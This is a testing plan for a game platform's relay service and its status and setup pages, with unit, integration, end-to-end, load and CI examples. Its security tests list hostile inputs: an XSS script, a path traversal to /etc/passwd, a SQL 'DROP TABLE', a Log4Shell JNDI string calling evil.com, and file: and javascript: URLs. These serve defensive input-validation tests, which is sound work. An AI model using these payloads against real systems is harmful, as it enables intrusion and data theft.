# GameHub Status and Setup Pages - Integration Testing Plan

## Overview

This comprehensive testing plan covers unit testing, integration testing, end-to-end testing, performance testing, and security testing for the GameHub Status and Setup Pages system. The plan ensures reliable operation across all components and integration points.

## Table of Contents

- [Testing Strategy](#testing-strategy)
- [Unit Testing Procedures](#unit-testing-procedures)
- [Integration Testing Scenarios](#integration-testing-scenarios)
- [End-to-End Testing Workflows](#end-to-end-testing-workflows)
- [Performance Testing Guidelines](#performance-testing-guidelines)
- [Security Testing Considerations](#security-testing-considerations)
- [Automated Testing Recommendations](#automated-testing-recommendations)
- [Test Environment Setup](#test-environment-setup)

## Testing Strategy

### Testing Pyramid

The testing strategy follows the testing pyramid approach:

```
                    ┌─────────────────┐
                    │   E2E Tests     │  ← Few, High-level
                    │   (Browser)     │
                    └─────────────────┘
                  ┌───────────────────────┐
                  │  Integration Tests    │  ← Some, API/Service
                  │  (API, WebSocket)     │
                  └───────────────────────┘
              ┌─────────────────────────────────┐
              │        Unit Tests               │  ← Many, Fast
              │  (Functions, Components)        │
              └─────────────────────────────────┘
```

### Testing Scope

**Components Under Test**:
1. **Relay Service** - API endpoints, WebSocket, service discovery
2. **Status Page** - UI components, real-time updates, responsiveness
3. **Setup Page** - Workflow, form validation, command generation
4. **Service Integration** - Observability endpoints, configuration validation
5. **System Integration** - End-to-end workflows, error handling

### Testing Environments

**Development Environment**:
- Local Docker Compose setup
- Mock services for isolated testing
- Debug logging enabled

**Staging Environment**:
- Production-like configuration
- Real service dependencies
- Performance monitoring enabled

**Production Environment**:
- Smoke tests only
- Health check validation
- Minimal impact testing

## Unit Testing Procedures

### Relay Service Unit Tests

#### Test Setup

```typescript
// test/setup.ts
import { jest } from '@jest/globals';

// Mock HTTP client
jest.mock('axios');
const mockedAxios = axios as jest.Mocked<typeof axios>;

// Mock WebSocket
jest.mock('ws');

// Test configuration
const testConfig = {
  services: {
    'test-service': {
      name: 'Test Service',
      healthEndpoint: 'http://test:8080/health',
      configuredEndpoint: 'http://test:8080/configured',
      readyEndpoint: 'http://test:8080/ready',
      timeout: 5000,
      retries: 3
    }
  },
  polling: {
    interval: 10000,
    timeout: 30000
  }
};
```

#### Service Discovery Tests

```typescript
// test/services/observability.service.test.ts
import { ObservabilityService } from '../../src/services/observability.service';

describe('ObservabilityService', () => {
  let service: ObservabilityService;

  beforeEach(() => {
    service = new ObservabilityService(testConfig);
  });

  describe('checkServiceHealth', () => {
    it('should return healthy status for responding service', async () => {
      // Arrange
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: { status: 'healthy', timestamp: '2025-01-09T15:30:15.123Z' }
      });

      // Act
      const result = await service.checkServiceHealth('test-service');

      // Assert
      expect(result.health).toBe(true);
      expect(result.responseTime).toBeGreaterThan(0);
      expect(result.error).toBeNull();
    });

    it('should return unhealthy status for non-responding service', async () => {
      // Arrange
      mockedAxios.get.mockRejectedValue(new Error('ECONNREFUSED'));

      // Act
      const result = await service.checkServiceHealth('test-service');

      // Assert
      expect(result.health).toBe(false);
      expect(result.error).toContain('ECONNREFUSED');
    });

    it('should retry failed requests according to configuration', async () => {
      // Arrange
      mockedAxios.get
        .mockRejectedValueOnce(new Error('Timeout'))
        .mockRejectedValueOnce(new Error('Timeout'))
        .mockResolvedValue({
          status: 200,
          data: { status: 'healthy' }
        });

      // Act
      const result = await service.checkServiceHealth('test-service');

      // Assert
      expect(mockedAxios.get).toHaveBeenCalledTimes(3);
      expect(result.health).toBe(true);
    });
  });

  describe('checkServiceConfiguration', () => {
    it('should parse configuration groups correctly', async () => {
      // Arrange
      const mockResponse = {
        status: 200,
        data: {
          configured: true,
          configuredGroups: {
            jwt: true,
            database: false,
            external_api: true
          }
        }
      };
      mockedAxios.get.mockResolvedValue(mockResponse);

      // Act
      const result = await service.checkServiceConfiguration('test-service');

      // Assert
      expect(result.configured).toBe(true);
      expect(result.configuredGroups).toEqual({
        jwt: true,
        database: false,
        external_api: true
      });
    });
  });

  describe('aggregateStatus', () => {
    it('should calculate summary statistics correctly', () => {
      // Arrange
      const serviceStatuses = {
        'service-1': { health: true, configured: true, ready: true },
        'service-2': { health: true, configured: false, ready: false },
        'service-3': { health: false, configured: true, ready: false }
      };

      // Act
      const summary = service.aggregateStatus(serviceStatuses);

      // Assert
      expect(summary.totalServices).toBe(3);
      expect(summary.healthyServices).toBe(2);
      expect(summary.configuredServices).toBe(2);
      expect(summary.readyServices).toBe(1);
      expect(summary.overallStatus).toBe('degraded');
    });
  });
});
```

#### WebSocket Handler Tests

```typescript
// test/routes/relay.routes.test.ts
import { WebSocketServer } from 'ws';
import { createServer } from 'http';

describe('WebSocket Handler', () => {
  let server: any;
  let wss: WebSocketServer;

  beforeEach(() => {
    server = createServer();
    wss = new WebSocketServer({ server });
  });

  afterEach(() => {
    wss.close();
    server.close();
  });

  it('should send initial status on connection', (done) => {
    // Arrange
    const mockStatus = {
      timestamp: '2025-01-09T15:30:15.123Z',
      services: {},
      summary: { totalServices: 0, healthyServices: 0 }
    };

    // Act
    const ws = new WebSocket('ws://localhost:8084/ws');
    
    ws.on('message', (data) => {
      const message = JSON.parse(data.toString());
      
      // Assert
      expect(message.type).toBe('status_update');
      expect(message.data).toEqual(mockStatus);
      done();
    });
  });

  it('should handle ping/pong heartbeat', (done) => {
    const ws = new WebSocket('ws://localhost:8084/ws');
    
    ws.on('message', (data) => {
      const message = JSON.parse(data.toString());
      
      if (message.type === 'ping') {
        // Send pong response
        ws.send(JSON.stringify({
          type: 'pong',
          timestamp: new Date().toISOString()
        }));
        done();
      }
    });
  });
});
```

### Status Page Unit Tests

#### Component Testing

```javascript
// test/status-page/components.test.js
describe('Status Page Components', () => {
  let mockWebSocket;
  let statusApp;

  beforeEach(() => {
    // Mock WebSocket
    mockWebSocket = {
      send: jest.fn(),
      close: jest.fn(),
      readyState: WebSocket.OPEN
    };
    
    global.WebSocket = jest.fn(() => mockWebSocket);
    
    // Initialize status app
    statusApp = new StatusApp();
  });

  describe('ServiceCard', () => {
    it('should render service status correctly', () => {
      // Arrange
      const serviceData = {
        health: true,
        configured: true,
        ready: false,
        configuredGroups: {
          jwt: true,
          database: false
        },
        responseTime: 45,
        lastChecked: '2025-01-09T15:30:15.123Z'
      };

      // Act
      const card = statusApp.createServiceCard('test-service', serviceData);

      // Assert
      expect(card.querySelector('.health-status')).toHaveClass('healthy');
      expect(card.querySelector('.config-status')).toHaveClass('configured');
      expect(card.querySelector('.ready-status')).toHaveClass('not-ready');
      expect(card.querySelector('.response-time')).toHaveTextContent('45ms');
    });

    it('should show configuration tooltip on hover', () => {
      // Arrange
      const serviceData = {
        configuredGroups: {
          jwt: true,
          database: false,
          external_api: true
        }
      };

      // Act
      const card = statusApp.createServiceCard('test-service', serviceData);
      const configStatus = card.querySelector('.config-status');
      
      // Simulate hover
      configStatus.dispatchEvent(new MouseEvent('mouseenter'));

      // Assert
      const tooltip = document.querySelector('.tooltip');
      expect(tooltip).toBeVisible();
      expect(tooltip).toHaveTextContent('JWT: ✅');
      expect(tooltip).toHaveTextContent('Database: ❌');
      expect(tooltip).toHaveTextContent('External API: ✅');
    });
  });

  describe('WebSocket Connection', () => {
    it('should establish WebSocket connection on initialization', () => {
      // Act
      statusApp.initializeWebSocket();

      // Assert
      expect(global.WebSocket).toHaveBeenCalledWith('ws://localhost/relay/ws');
    });

    it('should handle connection status updates', () => {
      // Arrange
      statusApp.initializeWebSocket();

      // Act
      mockWebSocket.onopen();

      // Assert
      const connectionStatus = document.querySelector('.connection-status');
      expect(connectionStatus).toHaveClass('connected');
      expect(connectionStatus).toHaveTextContent('Connected');
    });

    it('should attempt reconnection on disconnect', (done) => {
      // Arrange
      statusApp.initializeWebSocket();
      
      // Act
      mockWebSocket.onclose();

      // Assert
      setTimeout(() => {
        expect(global.WebSocket).toHaveBeenCalledTimes(2);
        done();
      }, 1100); // Wait for reconnection delay
    });
  });
});
```

### Setup Page Unit Tests

```javascript
// test/setup-page/wizard.test.js
describe('Setup Wizard', () => {
  let setupWizard;

  beforeEach(() => {
    setupWizard = new SetupWizard();
    document.body.innerHTML = '<div id="setup-container"></div>';
  });

  describe('Step Navigation', () => {
    it('should advance to next step when current step is complete', () => {
      // Arrange
      setupWizard.currentStep = 1;
      setupWizard.markStepComplete(1);

      // Act
      setupWizard.nextStep();

      // Assert
      expect(setupWizard.currentStep).toBe(2);
    });

    it('should not advance if current step is incomplete', () => {
      // Arrange
      setupWizard.currentStep = 1;

      // Act
      setupWizard.nextStep();

      // Assert
      expect(setupWizard.currentStep).toBe(1);
    });
  });

  describe('Command Generation', () => {
    it('should generate FusionAuth commands with API key', () => {
      // Arrange
      const apiKey = 'test-api-key-123';
      setupWizard.stepData.fusionauth = { apiKey };

      // Act
      const commands = setupWizard.generateFusionAuthCommands();

      // Assert
      expect(commands).toContain(`-H "Authorization: ${apiKey}"`);
      expect(commands).toContain('POST http://localhost:9011/api/application');
    });

    it('should generate tenant commands with public key', () => {
      // Arrange
      const publicKey = 'test-public-key-456';
      setupWizard.stepData.tenant = { publicKey };

      // Act
      const commands = setupWizard.generateTenantCommands();

      // Assert
      expect(commands).toContain(`VITE_TENANT_PUBLIC_KEY=${publicKey}`);
      expect(commands).toContain('docker-compose restart');
    });
  });

  describe('Form Validation', () => {
    it('should validate required fields', () => {
      // Arrange
      const form = setupWizard.createFusionAuthForm();
      const apiKeyInput = form.querySelector('#api-key');

      // Act
      const isValid = setupWizard.validateForm(form);

      // Assert
      expect(isValid).toBe(false);
      expect(apiKeyInput).toHaveClass('error');
    });

    it('should accept valid input', () => {
      // Arrange
      const form = setupWizard.createFusionAuthForm();
      const apiKeyInput = form.querySelector('#api-key');
      apiKeyInput.value = 'valid-api-key';

      // Act
      const isValid = setupWizard.validateForm(form);

      // Assert
      expect(isValid).toBe(true);
      expect(apiKeyInput).not.toHaveClass('error');
    });
  });
});
```

## Integration Testing Scenarios

### API Integration Tests

#### Relay Service API Tests

```typescript
// test/integration/relay-api.test.ts
import request from 'supertest';
import { app } from '../../src/server';

describe('Relay API Integration', () => {
  beforeAll(async () => {
    // Start test services
    await startTestServices();
  });

  afterAll(async () => {
    await stopTestServices();
  });

  describe('GET /relay', () => {
    it('should return aggregated service status', async () => {
      const response = await request(app)
        .get('/relay')
        .expect(200);

      expect(response.body).toHaveProperty('timestamp');
      expect(response.body).toHaveProperty('services');
      expect(response.body).toHaveProperty('summary');
      expect(response.body.summary.totalServices).toBeGreaterThan(0);
    });

    it('should handle service failures gracefully', async () => {
      // Stop one service
      await stopService('player-ip');

      const response = await request(app)
        .get('/relay')
        .expect(200);

      expect(response.body.services['player-ip'].health).toBe(false);
      expect(response.body.summary.overallStatus).toBe('degraded');

      // Restart service
      await startService('player-ip');
    });
  });

  describe('POST /relay/refresh', () => {
    it('should force cache refresh', async () => {
      const response = await request(app)
        .post('/relay/refresh')
        .expect(200);

      expect(response.body.message).toContain('refreshed');
      expect(response.body).toHaveProperty('timestamp');
    });
  });

  describe('WebSocket /relay/ws', () => {
    it('should establish WebSocket connection', (done) => {
      const ws = new WebSocket('ws://localhost:8084/relay/ws');
      
      ws.on('open', () => {
        expect(ws.readyState).toBe(WebSocket.OPEN);
        ws.close();
        done();
      });
    });

    it('should receive status updates', (done) => {
      const ws = new WebSocket('ws://localhost:8084/relay/ws');
      
      ws.on('message', (data) => {
        const message = JSON.parse(data.toString());
        
        expect(message.type).toBe('status_update');
        expect(message.data).toHaveProperty('services');
        
        ws.close();
        done();
      });
    });
  });
});
```

#### Service Endpoint Integration Tests

```typescript
// test/integration/service-endpoints.test.ts
describe('Service Endpoint Integration', () => {
  const services = [
    { name: 'player-ip', port: 8082 },
    { name: 'service-ip', port: 8083 },
    { name: 'content-store', port: 8081 }
  ];

  services.forEach(service => {
    describe(`${service.name} endpoints`, () => {
      const baseUrl = `http://localhost:${service.port}`;

      it('should respond to health check', async () => {
        const response = await request(baseUrl)
          .get('/health')
          .expect(200);

        expect(response.body.status).toBe('healthy');
        expect(response.body).toHaveProperty('timestamp');
      });

      it('should return configuration status', async () => {
        const response = await request(baseUrl)
          .get('/configured')
          .expect(200);

        expect(response.body).toHaveProperty('configured');
        expect(response.body).toHaveProperty('configuredGroups');
        expect(typeof response.body.configured).toBe('boolean');
      });

      it('should return readiness status', async () => {
        const response = await request(baseUrl)
          .get('/ready');

        expect([200, 503]).toContain(response.status);
        expect(response.body).toHaveProperty('ready');
        expect(typeof response.body.ready).toBe('boolean');
      });
    });
  });
});
```

### Database Integration Tests

```typescript
// test/integration/database.test.ts
describe('Database Integration', () => {
  beforeAll(async () => {
    await setupTestDatabase();
  });

  afterAll(async () => {
    await cleanupTestDatabase();
  });

  it('should handle database connection failures', async () => {
    // Stop database
    await stopDatabase();

    const response = await request('http://localhost:8082')
      .get('/ready')
      .expect(503);

    expect(response.body.ready).toBe(false);

    // Restart database
    await startDatabase();
  });

  it('should recover from database reconnection', async () => {
    // Restart database
    await restartDatabase();

    // Wait for reconnection
    await new Promise(resolve => setTimeout(resolve, 5000));

    const response = await request('http://localhost:8082')
      .get('/ready')
      .expect(200);

    expect(response.body.ready).toBe(true);
  });
});
```

## End-to-End Testing Workflows

### Browser-Based E2E Tests

#### Status Page E2E Tests

```javascript
// test/e2e/status-page.test.js
const { chromium } = require('playwright');

describe('Status Page E2E', () => {
  let browser, page;

  beforeAll(async () => {
    browser = await chromium.launch();
    page = await browser.newPage();
  });

  afterAll(async () => {
    await browser.close();
  });

  it('should load status page and display services', async () => {
    // Navigate to status page
    await page.goto('http://localhost/status');

    // Wait for page to load
    await page.waitForSelector('.service-card');

    // Verify service cards are displayed
    const serviceCards = await page.$$('.service-card');
    expect(serviceCards.length).toBeGreaterThan(0);

    // Verify connection status
    const connectionStatus = await page.$('.connection-status');
    const statusText = await connectionStatus.textContent();
    expect(statusText).toContain('Connected');
  });

  it('should show real-time updates', async () => {
    await page.goto('http://localhost/status');
    
    // Wait for initial load
    await page.waitForSelector('.service-card');

    // Get initial timestamp
    const initialTimestamp = await page.$eval(
      '.last-updated',
      el => el.textContent
    );

    // Wait for update (should happen within 10 seconds)
    await page.waitForFunction(
      (initial) => {
        const current = document.querySelector('.last-updated').textContent;
        return current !== initial;
      },
      initialTimestamp,
      { timeout: 15000 }
    );

    // Verify timestamp changed
    const updatedTimestamp = await page.$eval(
      '.last-updated',
      el => el.textContent
    );
    expect(updatedTimestamp).not.toBe(initialTimestamp);
  });

  it('should display configuration tooltips', async () => {
    await page.goto('http://localhost/status');
    await page.waitForSelector('.service-card');

    // Hover over configuration status
    await page.hover('.config-status');

    // Wait for tooltip to appear
    await page.waitForSelector('.tooltip', { state: 'visible' });

    // Verify tooltip content
    const tooltipText = await page.$eval('.tooltip', el => el.textContent);
    expect(tooltipText).toContain('Configuration Groups:');
  });

  it('should handle manual refresh', async () => {
    await page.goto('http://localhost/status');
    await page.waitForSelector('.refresh-button');

    // Click refresh button
    await page.click('.refresh-button');

    // Verify loading state
    await page.waitForSelector('.refresh-button.loading');

    // Wait for refresh to complete
    await page.waitForSelector('.refresh-button:not(.loading)');

    // Verify timestamp updated
    const timestamp = await page.$eval('.last-updated', el => el.textContent);
    expect(timestamp).toBeTruthy();
  });

  it('should be responsive on mobile', async () => {
    // Set mobile viewport
    await page.setViewportSize({ width: 375, height: 667 });
    await page.goto('http://localhost/status');

    // Verify mobile layout
    const container = await page.$('.services-grid');
    const gridColumns = await container.evaluate(el => 
      getComputedStyle(el).gridTemplateColumns
    );
    
    // Should be single column on mobile
    expect(gridColumns).toBe('1fr');
  });
});
```

#### Setup Page E2E Tests

```javascript
// test/e2e/setup-page.test.js
describe('Setup Page E2E', () => {
  let browser, page;

  beforeAll(async () => {
    browser = await chromium.launch();
    page = await browser.newPage();
  });

  afterAll(async () => {
    await browser.close();
  });

  it('should complete setup workflow', async () => {
    await page.goto('http://localhost/setup');

    // Step 1: Prerequisites
    await page.waitForSelector('.step-card.active');
    expect(await page.$eval('.step-title', el => el.textContent))
      .toContain('Prerequisites');

    // Complete step 1
    await page.click('.complete-step-button');
    await page.waitForSelector('.step-card.completed');

    // Step 2: Repository Setup
    await page.click('.next-step-button');
    await page.waitForSelector('.step-card.active');
    expect(await page.$eval('.step-title', el => el.textContent))
      .toContain('Repository');

    // Continue through all steps...
  });

  it('should generate commands correctly', async () => {
    await page.goto('http://localhost/setup');

    // Navigate to FusionAuth step
    await navigateToStep(page, 4);

    // Fill in API key
    await page.fill('#api-key', 'test-api-key-123');

    // Generate commands
    await page.click('.generate-commands');

    // Verify commands generated
    const commands = await page.$eval('.generated-commands', el => el.textContent);
    expect(commands).toContain('curl -X POST');
    expect(commands).toContain('test-api-key-123');
  });

  it('should validate form inputs', async () => {
    await page.goto('http://localhost/setup');
    await navigateToStep(page, 4);

    // Try to proceed without filling required fields
    await page.click('.next-step-button');

    // Verify validation errors
    const errorMessage = await page.$('.error-message');
    expect(errorMessage).toBeTruthy();

    const apiKeyInput = await page.$('#api-key');
    expect(await apiKeyInput.evaluate(el => el.classList.contains('error')))
      .toBe(true);
  });

  it('should persist progress across page reloads', async () => {
    await page.goto('http://localhost/setup');

    // Complete first step
    await page.click('.complete-step-button');
    await page.click('.next-step-button');

    // Reload page
    await page.reload();

    // Verify progress persisted
    const currentStep = await page.$eval('.step-indicator.active', 
      el => parseInt(el.dataset.step)
    );
    expect(currentStep).toBe(2);
  });
});
```

### Complete System Workflow Tests

```javascript
// test/e2e/system-workflow.test.js
describe('Complete System Workflow', () => {
  it('should complete full setup and monitoring workflow', async () => {
    const browser = await chromium.launch();
    const page = await browser.newPage();

    try {
      // 1. Start with unconfigured system
      await resetSystemConfiguration();

      // 2. Check status page shows unconfigured services
      await page.goto('http://localhost/status');
      const unconfiguredServices = await page.$$('.service-card .config-status.not-configured');
      expect(unconfiguredServices.length).toBeGreaterThan(0);

      // 3. Use setup page to configure system
      await page.goto('http://localhost/setup');
      await completeSetupWorkflow(page);

      // 4. Return to status page and verify configuration
      await page.goto('http://localhost/status');
      await page.waitForSelector('.service-card .config-status.configured');

      const configuredServices = await page.$$('.service-card .config-status.configured');
      expect(configuredServices.length).toBeGreaterThan(0);

      // 5. Verify real-time monitoring works
      await verifyRealTimeUpdates(page);

    } finally {
      await browser.close();
    }
  });
});
```

## Performance Testing Guidelines

### Load Testing

#### API Load Testing

```bash
#!/bin/bash
# load-test-api.sh

echo "Starting API load tests..."

# Test Relay Service under load
echo "Testing Relay Service..."
ab -n 1000 -c 10 -g relay-results.dat http://localhost/relay

# Test individual service endpoints
echo "Testing Player IP Service..."
ab -n 500 -c 5 -g player-ip-results.dat http://localhost:8082/health

echo "Testing Service IP Provider..."
ab -n 500 -c 5 -g service-ip-results.dat http://localhost:8083/health

echo "Testing Content Store..."
ab -n 500 -c 5 -g content-store-results.dat http://localhost:8081/health

# Generate performance report
echo "Generating performance report..."
python3 generate-performance-report.py
```

#### WebSocket Load Testing

```javascript
// test/performance/websocket-load.test.js
const WebSocket = require('ws');

describe('WebSocket Performance', () => {
  it('should handle multiple concurrent connections', async () => {
    const connectionCount = 50;
    const connections = [];
    const messageCount = [];

    // Create multiple connections
    for (let i = 0; i < connectionCount; i++) {
      const ws = new WebSocket('ws://localhost/relay/ws');
      connections.push(ws);
      messageCount[i] = 0;

      ws.on('message', () => {
        messageCount[i]++;
      });
    }

    // Wait for all connections to establish
    await Promise.all(connections.map(ws => 
      new Promise(resolve => ws.on('open', resolve))
    ));

    // Wait for messages
    await new Promise(resolve => setTimeout(resolve, 15000));

    // Verify all connections received messages
    messageCount.forEach((count, index) => {
      expect(count).toBeGreaterThan(0);
    });

    // Close all connections
    connections.forEach(ws => ws.close());
  });

  it('should maintain performance under message load', async () => {
    const ws = new WebSocket('ws://localhost/relay/ws');
    const messageTimestamps = [];

    ws.on('message', (data) => {
      const message = JSON.parse(data.toString());
      messageTimestamps.push({
        timestamp: new Date(message.timestamp),
        received: new Date()
      });
    });

    await new Promise(resolve => ws.on('open', resolve));

    // Force multiple refreshes to generate messages
    for (let i = 0; i < 10; i++) {
      await fetch('http://localhost/relay/refresh', { method: 'POST' });
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Analyze message latency
    const latencies = messageTimestamps.map(msg => 
      msg.received - msg.timestamp
    );

    const avgLatency = latencies.reduce((a, b) => a + b, 0) / latencies.length;
    expect(avgLatency).toBeLessThan(100); // Less than 100ms average latency

    ws.close();
  });
});
```

### Frontend Performance Testing

```javascript
// test/performance/frontend-performance.test.js
const { chromium } = require('playwright');

describe('Frontend Performance', () => {
  let browser, page;

  beforeAll(async () => {
    browser = await chromium.launch();
    page = await browser.newPage();
  });

  afterAll(async () => {
    await browser.close();
  });

  it('should load status page within performance budget', async () => {
    const startTime = Date.now();
    
    await page.goto('http://localhost/status');
    await page.waitForSelector('.service-card');
    
    const loadTime = Date.now() - startTime;
    expect(loadTime).toBeLessThan(2000); // Less than 2 seconds
  });

  it('should have good Core Web Vitals', async () => {
    await page.goto('http://localhost/status');
    
    // Measure Largest Contentful Paint (LCP)
    const lcp = await page.evaluate(() => {
      return new Promise((resolve) => {
        new PerformanceObserver((list) => {
          const entries = list.getEntries();
          const lastEntry = entries[entries.length - 1];
          resolve(lastEntry.startTime);
        }).observe({ entryTypes: ['largest-contentful-paint'] });
      });
    });
    
    expect(lcp).toBeLessThan(2500); // Good LCP is < 2.5s
  });

  it('should handle rapid updates efficiently', async () => {
    await page.goto('http://localhost/status');
    await page.waitForSelector('.service-card');

    // Monitor memory usage during rapid updates
    const initialMemory = await page.evaluate(() => performance.memory.usedJSHeapSize);

    // Trigger rapid updates
    for (let i = 0; i < 20; i++) {
      await fetch('http://localhost/relay/refresh', { method: 'POST' });
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    await new Promise(resolve => setTimeout(resolve, 2000));

    const finalMemory = await page.evaluate(() => performance.memory.usedJSHeapSize);
    const memoryIncrease = finalMemory - initialMemory;

    // Memory increase should be reasonable (< 10MB)
    expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024);
  });
});
```

## Security Testing Considerations

### Authentication and Authorization Testing

```javascript
// test/security/auth.test.js
describe('Security Testing', () => {
  describe('Endpoint Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Test with malformed requests
      const response = await request('http://localhost/relay')
        .get('/nonexistent')
        .expect(404);

      expect(response.body.error).not.toContain('password');
      expect(response.body.error).not.toContain('secret');
      expect(response.body.error).not.toContain('key');
    });

    it('should handle malicious input safely', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const input of maliciousInputs) {
        const response = await request('http://localhost/relay')
          .post('/refresh')
          .send({ malicious: input });

        // Should not crash or expose sensitive data
        expect([200, 400, 422]).toContain(response.status);
      }
    });
  });

  describe('CORS Security', () => {
    it('should enforce CORS policy', async () => {
      const response = await request('http://localhost/relay')
        .get('/')
        .set('Origin', 'http://malicious-site.com')
        .expect(200);

      // Should not allow unauthorized origins
      expect(response.headers['access-control-allow-origin']).not.toBe('http://malicious-site.com');
    });
  });

  describe('WebSocket Security', () => {
    it('should validate WebSocket origin', async () => {
      const ws = new WebSocket('ws://localhost/relay/ws', {
        origin: 'http://malicious-site.com'
      });

      await new Promise((resolve, reject) => {
        ws.on('error', resolve); // Expected to fail
        ws.on('open', () => reject(new Error('Should not connect')));
        setTimeout(resolve, 1000);
      });
    });
  });
});
```

### Input Validation Testing

```javascript
// test/security/input-validation.test.js
describe('Input Validation', () => {
  describe('Configuration Validation', () => {
    it('should reject invalid service configuration', () => {
      const invalidConfigs = [
        { services: null },
        { services: { 'test': { name: null } } },
        { services: { 'test': { healthEndpoint: 'not-a-url' } } },
        { polling: { interval: -1 } }
      ];

      invalidConfigs.forEach(config => {
        expect(() => validateRelayConfig(config)).toThrow();
      });
    });

    it('should sanitize service names', () => {
      const maliciousName = '<script>alert("xss")</script>';
      const sanitized = sanitizeServiceName(maliciousName);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('URL Validation', () => {
    it('should reject malicious URLs', () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'file:///etc/passwd',
        'ftp://internal-server/secrets',
        'http://localhost:22/ssh'
      ];

      maliciousUrls.forEach(url => {
        expect(() => validateServiceUrl(url)).toThrow();
      });
    });

    it('should allow only HTTP/HTTPS URLs', () => {
      const validUrls = [
        'http://localhost:8080/health',
        'https://api.example.com/status'
      ];

      validUrls.forEach(url => {
        expect(() => validateServiceUrl(url)).not.toThrow();
      });
    });
  });
});
```

## Automated Testing Recommendations

### Continuous Integration Pipeline

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      
      - name: Install dependencies
        run: |
          npm ci
          cd app/relay-service && npm ci
      
      - name: Run unit tests
        run: |
          cd app/relay-service
          npm run test:unit
      
      - name: Generate coverage report
        run: |
          cd app/relay-service
          npm run test:coverage
      
      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v3

  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:13
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Docker Compose
        run: |
          cd mesh
          cp .env.example .env
      
      - name: Start services
        run: |
          cd mesh
          docker-compose up -d --build
          sleep 60  # Wait for services to be ready
      
      - name: Run integration tests
        run: |
          npm run test:integration
      
      - name: Collect service logs
        if: failure()
        run: |
          cd mesh
          docker-compose logs > ../test-logs.txt
      
      - name: Upload logs
        if: failure()
        uses: actions/upload-artifact@v3
        with:
          name: service-logs
          path: test-logs.txt

  e2e-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install Playwright
        run: |
          npm ci
          npx playwright install
      
      - name: Start services
        run: |
          cd mesh
          cp .env.example .env
          docker-compose up -d --build
          sleep 60
      
      - name: Run E2E tests
        run: |
          npm run test:e2e
      
      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: playwright-report
          path: playwright-report/

  performance-tests:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup services
        run: |
          cd mesh
          cp .env.example .env
          docker-compose up -d --build
          sleep 60
      
      - name: Install Apache Bench
        run: sudo apt-get install -y apache2-utils
      
      - name: Run performance tests
        run: |
          ./scripts/performance-test.sh
      
      - name: Upload performance results
        uses: actions/upload-artifact@v3
        with:
          name: performance-results
          path: performance-results/
```

### Test Environment Setup

```bash
#!/bin/bash
# scripts/setup-test-env.sh

echo "Setting up test environment..."

# Create test environment file
cat > mesh/.env.test << EOF
NODE_ENV=test
LOG_LEVEL=error

# Test database
POSTGRES_HOST=localhost
POSTGRES_PORT=5433
POSTGRES_DB=gamehub_test
POSTGRES_USER=test
POSTGRES_PASSWORD=test

# Test services
RELAY_CACHE_TIMEOUT=1000
RELAY_CORS_ORIGIN=*

# Test configuration
RELAY_CONFIG={"services":{"test-service":{"name":"Test Service","healthEndpoint":"http://localhost:8080/health","configuredEndpoint":"http://localhost:8080/configured","readyEndpoint":"http://localhost:8080/ready"}},"polling":{"interval":5000,"timeout":10000}}
EOF

# Start test database
docker run -d \
  --name gamehub-test-db \
  -p 5433:5432 \
  -e POSTGRES_DB=gamehub_test \
  -e POSTGRES_USER=test \
  -e POSTGRES_PASSWORD=test \
  postgres:13

# Wait for database to be ready
echo "Waiting for test database..."
sleep 10

# Run database migrations
cd app/player-ip
npm run migrate:test

echo "Test environment ready!"
```

This comprehensive testing plan ensures the GameHub Status and Setup Pages system is thoroughly tested across all dimensions - functionality, performance, security, and user experience. The automated testing pipeline provides continuous validation of system quality and reliability.